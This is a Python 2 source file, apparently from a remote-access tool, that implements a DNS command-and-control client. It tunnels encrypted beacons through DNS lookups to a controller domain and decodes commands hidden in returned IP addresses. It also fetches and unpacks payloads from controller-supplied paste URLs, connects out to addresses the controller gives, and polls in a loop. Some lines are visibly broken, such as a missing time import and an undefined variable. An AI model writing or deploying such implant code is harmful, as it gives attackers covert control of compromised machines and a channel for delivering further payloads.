# -*- coding: utf-8 -*-

import struct
import socket
import base64
import string
import hashlib
import tinyec
import os
import platform
import random
import sys
import ascii85
import zlib
import tempfile
import subprocess
import logging
import urllib2

from ecpv import ECPV
from picocmd import *

from threading import Thread

class DnsCommandClientDecodingError(Exception):
    pass

class DnsCommandsClient(Thread):
    def __init__(self, domain, key):
        self.domain = domain
        self.translation = dict(zip(
            ''.join([
                ''.join([chr(x) for x in xrange(ord('A'), ord('Z') + 1)]),
                ''.join([chr(x) for x in xrange(ord('0'), ord('9') + 1)]),
                '=',
            ]),
            ''.join([
                ''.join([chr(x) for x in xrange(ord('a'), ord('z') + 1)]),
                '-',
                ''.join([chr(x) for x in xrange(ord('0'), ord('9') + 1)]),
            ])))
        self.encoder = ECPV(public_key=key)
        self.spi = None
        self.kex = None
        self.nonce = random.randrange(0, 1<<32-1)
        self.poll = 60
        self.active = True

        Thread.__init__(self)


    def _a_page_decoder(self, addresses, nonce, symmetric=None):
        if symmetric is None:
            symmetric = self.encoder.kex_completed

        resp = len(addresses)*[None]
        for address in addresses:
            raw = 0
            for part in [ int(x) << (3-i)*8 for i,x in enumerate(address.split('.')) ]:
                raw |= part

            idx = (raw & 0x1E000000) >> 25
            bits = (raw & 0x01FFFFFE) >> 1
            resp[idx] = struct.pack('>I', bits)[1:]

        data = b''.join(resp)
        length = struct.unpack_from('B', data)[0]
        payload = data[1:1+length]

        decoded = None

        try:
            decoded = self.encoder.decode(payload, nonce, symmetric)
        except Exception as e:
            logging.exception(e)
            raise DnsCommandClientDecodingError

        return decoded

    def _q_page_encoder(self, data):
        if len(data) > 35:
            raise ValueError('Too big page size')

        nonce = self.nonce
        encoded = '.'.join([
            ''.join([
                self.translation[x] for x in base64.b32encode(part)
            ]) for part in [
                struct.pack('>I', self.spi) if self.spi else None,
                struct.pack('>I', nonce),
                self.encoder.encode(data, nonce, symmetric=True)
            ] if part is not None
        ]) + '.' + self.domain

        self.nonce += len(encoded)
        return encoded, nonce

    def _request(self, *commands):
        parcel = Parcel(*commands)
        page, nonce = self._q_page_encoder(parcel.pack())

        try:
            _, _, addresses = socket.gethostbyname_ex(page)
            if len(addresses) < 2:
                logging.warning('DNSCNC: short answer: {}'.format(addresses))
                return []

        except socket.error as e:
            logging.error('DNSCNC: Communication error: {}'.format(e))
            return []

        response = None

        try:
            response = Parcel.unpack(
                self._a_page_decoder(addresses, nonce)
            )
        except ParcelInvalidCrc:
            logging.error('CRC FAILED / Fallback to Public-key decoding')

            try:
                response = Parcel.unpack(
                    self._a_page_decoder(addresses, nonce, False)
                )

                self.spi = None
                self.encoder.kex_reset()

            except ParcelInvalidCrc:
                logging.error('CRC FAILED / Fallback failed also / CRC')
                return []

            except ParcelInvalidPayload:
                logging.error('CRC FAILED / Fallback failed also / Invalid payload')
                return []

        return response.commands

    def on_pastelink(self, url, action, encoder):
        proxy = urllib2.ProxyHandler()
        opener = urllib2.build_opener(proxy)
        response = opener.open(url)
        if response.code == 200:
            try:
                content = response.read()
                content = ascii85.ascii85DecodeDG(content)
                content = self.encoder.unpack(content)
                content = zlib.decompress(content)
                chash, content = content[:20], content[20:]
                h = hashlib.sha1()
                h.update(content)
                if h.digest() == chash:
                    self.on_pastelink_content(url, action, content)
                else:
                    logging.error('PasteLink: Wrong hash after extraction: {} != {}'.format(
                        h.digest(), chash))
            except Exception as e:
                logging.exception(e)

    def on_pastelink_content(self, url, action, content):
        pass

    def on_connect(self, ip, port, transport):
        pass

    def on_exit(self):
        self.active = False

    def on_disconnect(self):
        pass

    def on_error(self, error, message=None):
        pass

    def process(self):
        commands = list(self._request(Poll()))
    	logging.debug('commands: {}'.format(commands))
        ack = self._request(Ack(len(commands)))
        if not ( len(ack) == 1 and isinstance(ack[0], Ack)):
            logging.error('ACK <-> ACK failed: received: {}'.format(ack))

        for command in commands:
            responses = []
            if isinstance(command, Policy):
                self.poll = command.poll

                if command.kex and not self.spi:
                    request = self.encoder.generate_kex_request()
                    kex = Kex(request)
                    response = self._request(kex)
                    if not len(response) == 1 and not isinstance(response[0], Kex):
                    	logging.error('KEX sequence failed. Got {} instead of Kex'.format(
                            response))
                        return

                    key = self.encoder.process_kex_response(response[0].parcel)
                    self.spi = kex.spi
            elif isinstance(command, Poll):
                ack = self._request(SystemInfo())
                if not len(response) == 1 and not isinstance(response[0], Ack):
                    logging.error('SystemInfo: ACK expected but {} found'.format(
                        response))
            elif isinstance(command, PasteLink):
                self.on_pastelink(command.url, command.action, self.encoder)
            elif isinstance(command, Connect):
                self.on_connect(command.ip, command.port, transport=command.transport)
            elif isinstance(command, Error):
                self.on_error(command.error, command.message)
            elif isinstance(command, Disconnect):
                self.on_disconnect()
            elif isinstance(command, Exit):
                self.active = False
                self.on_exit()

    def run(self):
        while True:
            try:
                self.process()
            except Exception as e:
                logging.exception(e)

            if self.active:
            	logging.debug('sleep {}'.format(self.poll))
                time.sleep(self.poll)
            else:
                break
